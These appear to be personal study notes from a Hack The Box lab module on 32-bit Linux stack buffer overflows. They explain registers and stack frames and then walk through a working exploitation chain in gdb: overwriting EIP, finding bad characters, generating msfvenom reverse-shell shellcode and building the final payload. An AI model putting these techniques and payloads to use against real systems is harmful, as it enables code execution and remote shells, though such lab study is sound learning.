# Stack-Based Buffer Overflows on Linux x86

## Contents

- [Introduction](#introduction)
  - [Buffer Overflows Overview]()
  - [Exploit Development Introduction]()
  - [CPU Architecture]()
- [Fundamentals]()
  - [Stack-Based Buffer Overflow]()
  - [CPU Registers]()
- [Exploit]()
  - [Take Control of EIP]()
  - [Determine the Length for Shellcode]()
  - [Identification of Bad Characters]()
  - [Generating Shellcode]()
  - [Identification of the Return Address]()
- [Proof-Of-Concept]()
  - [Public Exploit Modification]()
  - [Prevention Techniques and Mechanisms]()
- [Skills Assessment]()
  - [Skills Assessment - Buffer Overflow]()

# Introduction

## Buffer Overflows Overview

- **Less common** nowadays due to memory protections in modern compilers
- C and other languages are still prevalent in embedded systems and IoT
- CVE-2021-3156: Recent heap-based buffer overflow in sudo
- **Web applications** can also experience buffer overflows, such as CVE-2017-12542 with HP iLO devices
- Incorrect program code can **manipulate CPU processing**, causing crashes, data corruption, or harm to data structures
- Attackers can **execute commands** with vulnerable process privileges by overwriting return addresses with arbitrary data
- Root access is a popular target, but buffer overflows leading to standard user privileges can still be dangerous
- **Von-Neumann** architecture contributes to buffer overflow vulnerabilities
- C and C++ languages do not automatically monitor memory buffer limits, leading to increased vulnerability
- Java is less likely to experience buffer overflow conditions due to its garbage collection memory management technique.

Buffer overflows are caused by incorrect program code that cannot process large amounts of data, which overwrites registers and can execute code.

If data is written to the reserved memory **buffer** or **stack** that is not **limited**. To tackle this, we should write programs who have limits in their buffer

## Exploit Development Introduction

Exploit development is used in the phase of **Exploitation Phase**. This is after the version has been deemed exploitable. 

Developing our own exploits

- Very complex
- Requires a deep understand of CPU operations
- Software's functions that serve as our target

To write exploits we use Python. 

Code or programs that are exploits are a **proof-of-concept (POC)**

Types of exploits

- 0-day 
  - Newly identified vulnerability
  - Not public
  - Developer can not know this
  - Will persist with new updates
- N-day
  - Local
    - Executed when opening a file
      - PDF
      - Macro (.docx)
  - Remote
    - Get payload running on system
    - Executed over network
  - DoS
  - WebApp

## CPU Architecture

CPU use the Von-Neumann architecture

Four functional units

1. Memory
2. Control Unit
3. Arithmetical Logical Unit
4. Input/Output Unit

The most important one is the Arithmetical Logical Unit (ALU) and the Control Unit (CU), are combined to the Central Processing Unit (CPU)!

ALU + CU = CPU

They are responsiple for executing

- Instructions
- Flow control

Commands and data are **fetched** from memory

Bus system

- Connection between
  - Processor
  - Memory
  - Input/output unit

**All data are transeffered via the bus system**

Von-Neumann Architecture

![image](https://academy.hackthebox.com/storage/modules/31/von_neumann3.png)

### Memory

- Primary Memory
  - Cache
    - Buffer
    - Always fed with data and code
  - Random Access Memory (RAM)
    - Describes memory type
    - Memory adresses
- Secondary Memory
  - External storage
    - HDD/SSD
    - Flash Drives
    - CD/DVD-ROMs
    - **Not** directly accessed by the CPU
      - Uses the I/O interface
  - Higher storage capacity

Control Unit

- Reading data from the RAM
- Saving data in RAM
- Provide, decode and execute an instruction
- Processing the inputs from peripheral devices
- Processing of outputs to peripheral devices
- Interrupt control
- Monitoring of the entire system

The `CU` contains the `Instruction Register` (`IR`)

### Central Processing Unit

Often called the **Microprocessor**

CPU architectures

- `x86`/`i386` - (AMD & Intel)
- `x86-64`/`amd64` - (Microsoft & Sun)
- `ARM` - (Acorn)

#### RISC

Reduced Instruction Set Computer

Simplify the complexity of the instuction set for assembly

RISC are in most phones

**Fixed length** 

- 32-bit
- 64-bit

#### CISC

Complex Instrucion Set Computer

CISC does not require 32-bit or 64-bit. It can do it in 8-bit

### Instrucion Cycle

Taken from the Academy:

| **Instruction**                 | **Description**                                                                                                                                                                                                                                                                                                                   |
| ------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `1. FETCH`                      | The next machine instruction address is read from the `Instruction Address Register` (`IAR`). It is then loaded from the `Cache` or `RAM` into the `Instruction Register` (`IR`).                                                                                                                                                 |
| `2. DECODE`                     | The instruction decoder converts the instructions and starts the necessary circuits to execute the instruction.                                                                                                                                                                                                                   |
| `3. FETCH OPERANDS`             | If further data have to be loaded for execution, these are loaded from the cache or `RAM` into the working registers.                                                                                                                                                                                                             |
| `4. EXECUTE`                    | The instruction is executed. This can be, for example, operations in the `ALU`, a jump in the program, the writing back of results into the working registers, or the control of peripheral devices. Depending on the result of some instructions, the status register is set, which can be evaluated by subsequent instructions. |
| `5. UPDATE INSTRUCTION POINTER` | If no jump instruction has been executed in the EXECUTE phase, the `IAR` is now increased by the length of the instruction so that it points to the next machine instruction.                                                                                                                                                     |

# Fundamentals

## Stack-Based Buffer Overflow

Binary files

- Protable Executable Format (**PE**)
  - Used on Microsoft
- Executable and Linking Format (**ELF**)
  - Used on UNIX

### The Memory

![image](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_1.png)

.text

- assembler instructions

.data

- **global** and **static** variables

.bss

- allocated variables represented exclusively by 0 bits

Heap

- starts at the end of .bss and grows on the higher memory adresses

The Stack

- Last-In-First-Out
- Defined in **RAM**
- Accessed via a **stack pointer**

### Disable ASLR

```shellsession
student@nix-bow:~$ sudo su
root@nix-bow:/home/student# echo 0 > /proc/sys/kernel/randomize_va_space
root@nix-bow:/home/student# cat /proc/sys/kernel/randomize_va_space

0
```

### Compile C code to a 32bit ELF binary

```shellsession
student@nix-bow:~$ gcc bow.c -o bow32 -fno-stack-protector -z execstack -m32
student@nix-bow:~$ file bow32 | tr "," "\n"

bow: ELF 32-bit LSB shared object
 Intel 80386
 version 1 (SYSV)
 dynamically linked
 interpreter /lib/ld-linux.so.2
 for GNU/Linux 3.2.0
 BuildID[sha1]=93dda6b77131deecaadf9d207fdd2e70f47e1071
 not stripped
```

### AT&T Syntax

Dissasemble main

```shellcode
gdb -q *filename

(gdb) disassemble main
```

#### Break down the info

```shell
(gdb) disassemble main

Dump of assembler code for function main:
   0x00000582 <+0>:     lea    0x4(%esp),%ecx
   0x00000586 <+4>:     and    $0xfffffff0,%esp
   0x00000589 <+7>:     pushl  -0x4(%ecx)
   0x0000058c <+10>:    push   %ebp
   0x0000058d <+11>:    mov    %esp,%ebp
   0x0000058f <+13>:    push   %ebx
   0x00000590 <+14>:    push   %ecx
   0x00000591 <+15>:    call   0x450 <__x86.get_pc_thunk.bx>
   0x00000596 <+20>:    add    $0x1a3e,%ebx
   0x0000059c <+26>:    mov    %ecx,%eax
   0x0000059e <+28>:    mov    0x4(%eax),%eax
   0x000005a1 <+31>:    add    $0x4,%eax
   0x000005a4 <+34>:    mov    (%eax),%eax
   0x000005a6 <+36>:    sub    $0xc,%esp
   0x000005a9 <+39>:    push   %eax
   0x000005aa <+40>:    call   0x54d <bowfunc>
   0x000005af <+45>:    add    $0x10,%esp
   0x000005b2 <+48>:    sub    $0xc,%esp
   0x000005b5 <+51>:    lea    -0x1974(%ebx),%eax
   0x000005bb <+57>:    push   %eax
   0x000005bc <+58>:    call   0x3e0 <puts@plt>
   0x000005c1 <+63>:    add    $0x10,%esp
   0x000005c4 <+66>:    mov    $0x1,%eax
   0x000005c9 <+71>:    lea    -0x8(%ebp),%esp
   0x000005cc <+74>:    pop    %ecx
   0x000005cd <+75>:    pop    %ebx
   0x000005ce <+76>:    pop    %ebp
   0x000005cf <+77>:    lea    -0x4(%ecx),%esp
   0x000005d2 <+80>:    ret    
End of assembler dump.
```

First column

- **Hexidecimals **that represent the **memory adresses**

| **Memory Address** | **Address Jumps** | **Assembler Instruction** | **Operation Suffixes** |
| ------------------ | ----------------- | ------------------------- | ---------------------- |
| 0x00000582         | <+0>:             | lea                       | 0x4(%esp),%ecx         |
| 0x00000586         | <+4>:             | and                       | $0xfffffff0,%esp       |
| ...                | ...               | ...                       | ...                    |

### Intel Syntax

```shellsession
gdb) set disassembly-flavor intel
(gdb) disassemble main

Dump of assembler code for function main:
   0x00000582 <+0>:        lea    ecx,[esp+0x4]
   0x00000586 <+4>:        and    esp,0xfffffff0
   0x00000589 <+7>:        push   DWORD PTR [ecx-0x4]
   0x0000058c <+10>:    push   ebp
   0x0000058d <+11>:    mov    ebp,esp
   0x0000058f <+13>:    push   ebx
   0x00000590 <+14>:    push   ecx
   0x00000591 <+15>:    call   0x450 <__x86.get_pc_thunk.bx>
   0x00000596 <+20>:    add    ebx,0x1a3e
   0x0000059c <+26>:    mov    eax,ecx
   0x0000059e <+28>:    mov    eax,DWORD PTR [eax+0x4]
```

### Change GDB Syntax

```shellsession
student@nix-bow:~$ echo 'set disassembly-flavor intel' > ~/.gdbinit
```

### Q:  At which address in the "main" function is the "bowfunc" function gets called?

Attack chain

Check filetype

```shellsession
 file bow32 | tr "," "\n
```

Open up file in gdb

```shellsession
gdn -q bow
```

Set the syntax to intel

```shellsession
(gdb) set disassembly-flavor intel
```

Check out bowfunc

```shellsession
(gdb) disassemble main
```

Screenshot:

![](C:\Users\danie\AppData\Roaming\marktext\images\2023-04-25-20-33-47-image.png)

Then it is just to read out the hexidecimal from the memory adress! 

## CPU Registers

Registers offer a small amount of storage space where data can be stored temporarily.

Types of registers

- General registers
  
  - Data registers
  
  - Pointer registers
  
  - Index registers

- Control registers

- Segment registers

#### Data registers

| **32-bit Register** | **64-bit Register** | **Description**                                                                                             |
| ------------------- | ------------------- | ----------------------------------------------------------------------------------------------------------- |
| `EAX`               | `RAX`               | Accumulator is used in input/output and for arithmetic operations                                           |
| `EBX`               | `RBX`               | Base is used in indexed addressing                                                                          |
| `ECX`               | `RCX`               | Counter is used to rotate instructions and count loops                                                      |
| `EDX`               | `RDX`               | Data is used for I/O and in arithmetic operations for multiply and divide operations involving large values |

#### Pointer registers

| **32-bit Register** | **64-bit Register** | **Description**                                                                                             |
| ------------------- | ------------------- | ----------------------------------------------------------------------------------------------------------- |
| `EIP`               | `RIP`               | Instruction Pointer stores the offset address of the next instruction to be executed                        |
| `ESP`               | `RSP`               | Stack Pointer points to the top of the stack                                                                |
| `EBP`               | `RBP`               | Base Pointer is also known as `Stack Base Pointer` or `Frame Pointer` thats points to the base of the stack |

### Stack Frames

- The stack starts with a high address and grows down to low memory addresses.
- The **Base Pointer** points to the beginning (base) of the stack and the Stack Pointer points to the top of the stack.
- The stack is divided into regions called **Stack Frames** that allocate memory for functions as they are called.
- A **stack frame** defines a frame of data with the **beginning (EBP)** and the **end (ESP)**. 
- The stack memory is built on a Last-In-First-Out (LIFO) data structure.

### Prologue

```shell
(gdb) disas bowfunc 

Dump of assembler code for function bowfunc:
   0x0000054d <+0>:        push   ebp       # <---- 1. Stores previous EBP
   0x0000054e <+1>:        mov    ebp,esp   # <---- 2. Creates new Stack Frame
   0x00000550 <+3>:        push   ebx
   0x00000551 <+4>:        sub    esp,0x404 # <---- 3. Moves ESP to the top
   <...SNIP...>
   0x00000580 <+51>:    leave  
   0x00000581 <+52>:    ret    :    ret    
```

This is called the Prologue. Moving the ESP on the top for operations.

### Epilogue

```shell
(gdb) disas bowfunc 

Dump of assembler code for function bowfunc:
   0x0000054d <+0>:        push   ebp       
   0x0000054e <+1>:        mov    ebp,esp   
   0x00000550 <+3>:        push   ebx
   0x00000551 <+4>:        sub    esp,0x404 
   <...SNIP...>
   0x00000580 <+51>:    leave  # <----------------------
   0x00000581 <+52>:    ret    # <--- Leave stack frame
```

In the epilogue, the **current EBP replaces ESP**, and it goes back to its original value from the start of the function. The epilogue is short and can be done in different ways, but our example does it with only two instructions.

#### Index registers

| **Register 32-bit** | **Register 64-bit** | **Description**                                                         |
| ------------------- | ------------------- | ----------------------------------------------------------------------- |
| `ESI`               | `RSI`               | Source Index is used as a pointer from a source for string operations   |
| `EDI`               | `RDI`               | Destination is used as a pointer to a destination for string operations |

### Endianness

During load and save operations in registers and memories, the bytes are read in a different order. This byte order is called `endianness`. Endianness is distinguished between the `little-endian` format and the `big-endian` format.

`Big-endian` and `litt~~le-endian` are about the order of valence. I~~n `big-endian`, the digits with the highest valence are initially. In `little-endian`, the digits with the lowest valence are at the beginning. Mainframe processors use the `big-endian` format, some RISC architectures, minicomputers, and in TCP/IP networks, the byte order is also in `big-endian` format.

Now, let us look at an example with the following values:

- Address: `0xffff0000`
- Word: `\xAA\xBB\xCC\xDD`

| **Memory Address** | **0xffff0000** | **0xffff0001** | **0xffff0002** | **0xffff0003** |
| ------------------ | -------------- | -------------- | -------------- | -------------- |
| Big-Endian         | AA             | BB             | CC             | DD             |
| Little-Endian      | DD             | CC             | BB             | AA             |

This is very important for us to enter our code in the right order later when we have to tell the CPU to which address it should point.

# Exploit

## Take Control of EIP

We need to get the **instruction pointer (EIP)** under control, so we can tell it to which adress it should jump to!

This will make it point to the adress where our shellcode starts and the CPU executes it.

#### Seqmentation Fault

```shell
student@nix-bow:~$ gdb -q bow32

(gdb) run $(python -c "print '\x55' * 1200")
Starting program: /home/student/bow/bow32 $(python -c "print '\x55' * 1200")

Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()
```

Here we insert 1200 "U"s with running python code into our program. And we have indeed overwritten the EIP. 

## Determine the Length for Shellcode

Make shellcode with `msfvenom`

```shell
DanielBoye@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c

No encoder or badchars specified, outputting raw payload
Payload size: 68 bytes
```

Now we can see that our payload is 68 bytes.

Leverage some `no operation instructions (NOPS)`. This is so our shellcode will be executed at the right place. It is just to push it further away.

 Shellcode - Length

```shell
Buffer = "\x55" * (1040 - 100 - 150 - 4) = 786     
    NOPs = "\x90" * 100
Shellcode = "\x44" * 150      
    EIP = "\x66" * 4'
```

How the buffer will look: 

![image](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_8.png)

### Use in practice

Command:

```
run $(python -c 'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')` 
```

In gdb:

```shell
(gdb) run $(python -c 'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')

The program being debugged has been started already.Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')
Program received signal SIGSEGV, Segmentation fault.0x66666666 in ?? ()
```

## Identification of Bad Characters

Bad characters:

- `\x00` - Null Byte
- `\x0A` - Line Feed
- `\x0D` - Carriage Return
- `\xFF` - Form Feed

To find it we can use this character list: `CHARS="\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"` 

And with using this we can try and find bad characters with running the previous command, just with the wordlist as our payload.

### Breakpoints

To break a function we use `break *function` 

```shell
(gdb) break bowfunc 

Breakpoint 1 at 0x56555551
```

### Sending the characters

```shell
(gdb) run $(python -c 'print "\x55" * (1040 - 256 - 4) + "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')

Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 256 - 4) + "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
/bin/bash: warning: command substitution: ignored null byte in inputBreakpoint 1, 0x56555551 in bowfunc ()
```

To look at the stack:

```shell
(gdb) x/2000xb $esp+500

0xffffd28a:    0xbb    0x69    0x36    0x38    0x36    0x00    0x00    0x00
0xffffd292:    0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xffffd29a:    0x00    0x2f    0x68    0x6f    0x6d    0x65    0x2f    0x73
0xffffd2a2:    0x74    0x75    0x64    0x65    0x6e    0x74    0x2f    0x62
0xffffd2aa:    0x6f    0x77    0x2f    0x62    0x6f    0x77    0x33    0x32
0xffffd2b2:    0x00    0x55    0x55    0x55    0x55    0x55    0x55    0x55
                 # |---> "\x55"s begin

0xffffd2ba: 0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
0xffffd2c2: 0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
<SNIP>
```

We will look where the 0x55 ends. 

```shell
0xffffd5aa:    0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
0xffffd5b2:    0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
0xffffd5ba:    0x55    0x55    0x55    0x55    0x55    0x01    0x02    0x03
                                                 # |---> CHARS begin

0xffffd5c2:    0x04    0x05    0x06    0x07    0x08    0x00    0x0b    0x0c
0xffffd5ca:    0x0d    0x0e    0x0f    0x10    0x11    0x12    0x13    0x14
0xffffd5d2:    0x15    0x16    0x17    0x18    0x19    0x1a    0x1b    0x1c
```

Every `null byte (\x00)` shows us that this character is a bad character.

### Q: Find all bad characters that change or interrupt our sent bytes' order and submit them as the answer (e.g., format: \x00\x11).

`\x00\x09\x0A\x20`

## Generating Shellcode

When generating shell code, pay attention to these ares

- `Architecture`
- `Platform`
- `Bad Characters`

### MSFvenom Syntax

```shell
DanielBoye@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp lhost=<LHOST> lport=<LPORT> --format c --arch x86 --platform linux --bad-chars "<chars>" --out <filename>
```

### MSFvenom - Generate Shellcode

```shell
DanielBoye@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out shellcode

Found 11 compatible encodersAttempting to encode payload with 1 iterations of x86/shikata_ga_naix86/shikata_ga_nai succeeded with size 95 (iteration=0)x86/shikata_ga_nai chosen with final size 95Payload size: 95 bytesFinal size of c file: 425 bytesSaved as: shellcode
```

### Shellcode

```shell
DanielBoye@htb[/htb]$ cat shellcode

unsigned char buf[] = "\xda\xca\xba\xe4\x11\xd4\x5d\xd9\x74\x24\xf4\x58\x29\xc9\xb1""\x12\x31\x50\x17\x03\x50\x17\x83\x24\x15\x36\xa8\x95\xcd\x41""\xb0\x86\xb2\xfe\x5d\x2a\xbc\xe0\x12\x4c\x73\x62\xc1\xc9\x3b"<SNIP>
```

### Exploit with Shellcode

```shell
(gdb) run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba\xe4...<SNIP>...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')

The program being debugged has been started already.Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba\xe4...<SNIP>...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')

Breakpoint 1, 0x56555551 in bowfunc ()
```

### The Stack

```shell
(gdb) x/2000xb $esp+550

<SNIP>0xffffd64c:    0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x900xffffd654:    0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x900xffffd65c:    0x90    0x90    0xda    0xca    0xba    0xe4    0x11    0xd4
                         # |----> Shellcode begins
<SNIP>
```

## Identification of the Return Address

### GDB NOPS

```shell
(gdb) x/2000xb $esp+1400

<SNIP>0xffffd5ec:    0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x550xffffd5f4:    0x55    0x55    0x55    0x55    0x55    0x55    0x90    0x90
                                # End of "\x55"s   ---->|  |---> NOPS
0xffffd5fc:    0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x900xffffd604:    0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x900xffffd60c:    0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x900xffffd614:    0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x900xffffd61c:    0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x900xffffd624:    0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x900xffffd62c:    0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x900xffffd634:    0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x900xffffd63c:    0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x900xffffd644:    0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x900xffffd64c:    0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x900xffffd654:    0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x900xffffd65c:    0x90    0x90    0xda    0xca    0xba    0xe4    0x11    0xd4
                         # |---> Shellcode
<SNIP>
```

This picture illustrates where the adress `0xffffd64c` is. 

![image](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_9.png)

After selecting a memory address, we replace our "`\x66`" which overwrites the EIP to tell it to jump to the `0xffffd64c` address. Note that the input of the address is entered backward.

### Exploitation

```shell
(gdb) run $(python -c 'print "\x55" * (1040 - 100 - 95 - 4) + "\x90" * 100 + "\xda\xca\xba...<SNIP>...\x5a\x22\xa2" + "\x4c\xd6\xff\xff"')
```

# Proof-Of-Concept

## Public Exploit Modification

When working with exploits, public ones might not work in your case. That is why we should learn how to edit and write exploits so we can fine tune them to our own usecase. 

## Prevention Techniques and Mechanisms

Security mechanism preventing this

- `Canaries`
  - Known values written to the stack between **buffer and control data**, to **detect buffer overflows**
- `Address Space Layout Randomization` (`ASLR`)
  - Difficult to find target adresses in memory
- `Data Execution Prevention` (`DEP`)
  - Monitors that the program access memory areas cleanly

# Skills Assessment

## Skills Assessment - Buffer Overflow

### Q: Determine the file type of "leave_msg" binary and submit it as the answer.
